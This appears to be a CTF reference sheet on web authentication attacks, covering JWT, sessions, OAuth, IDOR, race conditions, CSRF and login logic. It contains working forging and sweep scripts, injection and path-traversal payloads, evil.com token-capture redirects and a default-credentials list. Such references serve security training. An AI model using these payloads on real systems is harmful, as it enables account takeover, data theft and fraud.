# Auth attacks — JWT, sessions, OAuth, IDOR, races, logic

All remote testing gated by router rules. JWT forging/cracking is local work — do it
freely; only the verification request touches the target.

## 1. JWT

Structure: `base64url(header).base64url(payload).base64url(signature)` — header
typically `{"alg":"HS256","typ":"JWT"}`.

```bash
skills/ctf-web/scripts/jwt-inspect.py "$TOKEN"                 # decode + suspicious flags
skills/ctf-web/scripts/jwt-inspect.py "$TOKEN" --crack wordlist.txt
```

### Attack table

| Weakness | Detection | Exploit |
|---|---|---|
| `alg: none` accepted | server verifies signature-less tokens | send header `{"alg":"none","typ":"JWT"}` + payload, empty signature, trailing dot kept |
| Weak HMAC secret (HS*) | short token, no leak | `hashcat -m 16500 jwt.txt rockyou.txt` or `jwt-inspect.py --crack` |
| RS256 → HS256 confusion | server exposes public key (JWKS endpoint, `/static/pub.pem`, TLS cert) | re-sign token as HS256, secret = **public key PEM bytes** (exact bytes incl. newlines) |
| `kid` header SQLi | kid used in query | header `{"alg":"HS256","kid":"x' UNION SELECT 'attacker-secret'--"}`, sign HMAC with `attacker-secret` |
| `kid` path traversal | kid used as filename | `{"kid":"../../../../dev/null"}` → sign with empty secret; or kid → `/proc/self/environ` etc. |
| `jku` header SSRF | server fetches JWKS from `jku` URL | host your own JWKS at that URL, sign with the matching private key |
| `x5u`/`x5c` header | cert URL fetched/used | same idea — point at attacker-controlled cert chain |
| `exp` unchecked server-side | expired token still works (or exp in header only) | keep using old admin token; forge far-past exp |
| Claims trusted from client | payload carries `role`/`admin` you can edit after forging | flip to `true`/`1`/`"admin"` |

### Forging locally (stdlib, no deps)

```python
import base64, hmac, hashlib, json
def b64u(b): return base64.urlsafe_b64encode(b).rstrip(b'=')
h = b64u(json.dumps({"alg":"HS256","typ":"JWT"}).encode())
p = b64u(json.dumps({"user":"admin","role":"admin"}).encode())
sig = b64u(hmac.new(b"leaked-or-cracked-secret", h + b'.' + p, hashlib.sha256).digest())
print((h + b'.' + p + b'.' + sig).decode())
```

Tools: `jwt_tool` (clone https://github.com/ticarpi/jwt_tool, needs
`uv pip install --python .venv/bin/python pycryptodomex`):

```bash
scripts/ctf python jwt_tool.py "$TOKEN" -X n            # alg:none variants
scripts/ctf python jwt_tool.py "$TOKEN" -X k -pk pub.pem # key confusion
scripts/ctf python jwt_tool.py "$TOKEN" -C -d wordlist.txt   # crack HS secrets
```

## 2. Sessions and cookies

| Check | Bug | Exploit |
|---|---|---|
| Cookie set before login still valid after | session fixation | set your low-priv session cookie value on the admin/victim, trigger their login |
| Session token not rotated on login/privilege change | fixation variant | reuse old token at higher privilege |
| No `HttpOnly` | XSS steals cookie | see `references/client.md` |
| No `Secure` / `SameSite=None` without need | sniffing / CSRF | CSRF POSTs ride along |
| Predictable tokens (username, uid, timestamp, short hex) | session forging | enumerate other users' tokens |
| Server-side sessions keyed by client-controlled id (`sess_<md5(user)>`) | hijack | craft key of `admin` |

Cookie jar flow with curl:

```bash
curl -s -c jar.txt "$base/login" -d 'user=a&pass=b'
curl -s -b jar.txt "$base/profile"
```

## 3. OAuth / OpenID Connect

| Flaw | Test | Result |
|---|---|---|
| `redirect_uri` not validated | swap to `https://evil.com` or `//evil.com` or subdomain-path bypass | code/token delivered to you |
| `redirect_uri` prefix/suffix match | append `.evil.com`, `/../`, `@`, `evil.com/target.com` | bypass |
| open redirect on post-login landing | chain: valid redirect_uri → open redirect | steal code from Referer/URL |
| No `state` parameter | complete flow from attacker browser | login CSRF / code injection into victim |
| Implicit flow (`response_type=token`) | hash-fragment token | token leaks via Referer/JS history |
| `state` present but unvalidated | mutate it | still accepted → CSRF possible |

Always replay the full flow in mitmproxy and read both legs: the authorization
request (what the app sends) and the callback (what the app consumes).

## 4. IDOR — enumerate methodically

1. Two accounts (victim/attacker). Note every object id the victim can access.
2. Replay victim's request with attacker session, changing only the identifier:
   numeric `?id=101..999` step through neighbors; UUIDs leak elsewhere
   (search JS, exports, admin listing, `/api/users/me` referencing others).
3. Try all shapes: path `/api/orders/123`, body `{"order":123}`, header
   `X-User-Id: 123`, method swap `GET /users/123/profile` vs `GET /profile?user=123`.
4. Watch for horizontal→vertical: change id to admin's id, or add `?admin=1`.
5. Script the sweep (throttle politely — these are gated remote targets):

```python
import requests
s = requests.Session(); s.cookies.set('session', 'ATTACKER')
for i in range(1, 200):
    r = s.get(f"http://target/api/notes/{i}", timeout=5)
    if r.status_code == 200 and 'error' not in r.text.lower()[:80]:
        print(i, r.text[:120])
```

## 5. Mass assignment

Registration/profile update silently accepting extra fields:

```bash
curl -s "$base/register" -H 'Content-Type: application/json' \
  -d '{"username":"u1","password":"p","isAdmin":true,"role":"admin","admin":1,"verified":true}'
```

Candidate field names: `isAdmin, admin, role, roles, admin_level, active, verified,
is_staff, group, permissions, credit, balance, price, discount`. Also try nested:
`{"user":{"username":"u1","admin":true}}` and form-encoded variants. Compare the
JSON the API returns on GET-after-POST — hidden fields accepted and persisted show up.

## 6. Race conditions

Single endpoint hit in parallel (coupon redeem, transfer, vote, checkout, limit bypass):

Burp: Repeater tab → duplicate request N times → select all → right pane
"Send group in parallel (single-packet)" — fires on one TCP connection for max
synchronization. Turbo Intruder (extension) for larger N.

Scripted (requests from `.venv`, distinct sockets per thread — one Session would serialize):

```python
import requests, threading
URL, BODY, N = "http://target/api/redeem", {"code": "WELCOME"}, 40
barrier = threading.Barrier(N)
sessions = [requests.Session() for _ in range(N)]     # pre-auth all of them first
def fire(i):
    barrier.wait()
    print(i, sessions[i].post(URL, json=BODY).status_code)
ts = [threading.Thread(target=fire, args=(i,)) for i in range(N)]
[t.start() for t in ts]; [t.join() for t in ts]
```

Patterns: N parallel redeems of one code, transfer + check-balance interleave,
register same username twice, TOCTOU on file read/write (see deser-files.md).

## 7. CSRF

- Missing token on state-changing POST → craft cross-site form (needs victim visit;
  in CTFs usually an admin bot visits your report URL).
- Token present but not validated: drop it, replay it, swap users' tokens.
- `SameSite=Lax` blocks cross-site POST cookies in modern browsers; check if the
  endpoint also accepts GET (method swap turns Lax-protected POST into GET CSRF).
- JSON endpoints: CSRF via `fetch` with `mode:'no-cors'` and text/plain content type.

## 8. Default credentials (CTF-first list)

| user | pass |
|---|---|
| admin | admin |
| admin | password, admin123, 1234, changeme, letmein |
| administrator | administrator |
| root | root, toor |
| guest | guest |
| test / user / demo | test / user / demo |
| (from README/source) | changeme, Password1 |

Try immediately on any login form, adminer, phpMyAdmin, Jenkins, Grafana, DB creds
reused from `.env`. CTF admins reuse creds across services constantly.

## 9. Register/login logic flaws

| Flaw | Test |
|---|---|
| Case-insensitive uniqueness, case-sensitive lookup (or reverse) | register `ADMIN` when `admin` exists; login as `Admin` |
| Accent/case-insensitive collation collision | register `admín` (acute i) — MySQL `utf8mb4_general_ci` and `utf8mb4_0900_ai_ci` compare it equal to `admin` |
| Silent truncation (MySQL strict mode off, or PAD SPACE collations ≤5.7 ignoring trailing spaces) | register `admin            x` (padding past column length) |
| Registration disabled? try: `?register=0`, OAuth signup path, password reset as login oracle |
| Username enumeration | diff responses/timing for existing vs unknown user; forgot-password leaks |
| Password reset token: predictable (timestamp, uid hash, MT), reusable, unlimited attempts | request two resets, diff tokens |
| Login SQLi on old MySQL: `admin' -- ` | see `references/injection.md` |
| Object-level: `/register` accepts `role` param | mass assignment above |

Collation note: accent folding (`é`≡`e`) holds for `utf8mb4_general_ci` and the
`*_ai_ci` family; trailing-space padding differs by collation (PAD SPACE ≤ MySQL 5.7
defaults vs NO PAD `utf8mb4_0900_*` in MySQL 8) — verify locally with the same DB
version if source is available rather than assuming.
